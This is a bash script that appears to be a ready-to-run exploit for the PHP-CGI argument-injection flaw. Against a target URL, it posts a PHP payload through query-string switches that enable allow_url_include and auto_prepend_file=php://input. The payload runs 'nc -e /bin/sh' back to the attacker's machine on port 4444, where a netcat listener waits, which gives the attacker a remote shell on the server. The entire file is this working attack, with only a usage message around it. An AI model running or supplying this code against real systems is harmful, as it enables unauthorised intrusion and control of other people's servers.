#!/bin/bash

function ctrl_c() {
  echo -e "\n\n[!] Exiting..."
  exit 1
}

trap ctrl_c SIGINT

if [ $# -ne 1 ]; then
    echo -e "\n[!] Usage: $0 <RHOST>"
    echo -e "\nExample: $0 http://10.128.20.2 \n"
    exit 1
fi

rhost=$1
lhost=$(hostname -I)

exploit() {
    payload="<?php system('nc -e /bin/sh $lhost 4444'); die(); ?>"

    sleep 1 &
    curl -s -X POST "$rhost/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" -d "$payload" --connect-timeout 0 &
    nc -lp 4444 -v
    
    if [ $? -ne 0 ]; then
        echo "[!] Exploit failed!"
    fi
}

exploit
